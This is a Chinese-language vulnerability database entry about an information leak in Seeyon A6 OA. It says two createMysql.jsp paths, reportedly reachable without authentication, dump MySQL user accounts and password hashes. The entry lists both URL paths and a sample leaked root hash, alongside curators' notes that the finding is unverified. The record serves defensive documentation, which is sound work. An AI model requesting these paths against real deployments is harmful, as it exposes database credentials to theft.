---
source: "hatch 补库批 20260928"
title: "致远A6 createMysql.jsp数据库用户/hash信息泄漏"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6；两路径同名页面，数据库mysql.user可读"
prerequisites: "声称直接访问，未明确鉴权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%80%EF%BC%89.md"
id: "vw-c37d52471039ae5dd31c843b"
entity_id: "ve-c37d52471039ae5dd31c843b"
schema_version: "1"
---

# 致远A6 createMysql.jsp数据库用户/hash信息泄漏

## 条目说明

- 对象与具体问题：致远A6；createMysql.jsp数据库用户/hash信息泄漏
- 版本、配置及部署条件：A6；两路径同名页面，数据库mysql.user可读
- 认证与权限前提：声称直接访问，未明确鉴权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两入口/yyoa/createMysql.jsp和/ext/createMysql.jsp需独立路径列表，不拆成两漏洞未经根因判断
- 仅列账号/hash样本，无HTTP响应或源码证明SELECT*；缺来源/补丁
- 标题一应改实际接口，别与所有A6信息泄露合并

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

该漏洞泄露了数据库用户的账号，密码hash。访问该文件直接执行了Select \*
from mysql.user;并回显

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

###### 漏洞位置:

    http://www.0-sec.org/yyoa/createMysql.jsp

    http://www.0-sec.org/yyoa/ext/createMysql.jsp

回显内容：

    root

    *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC
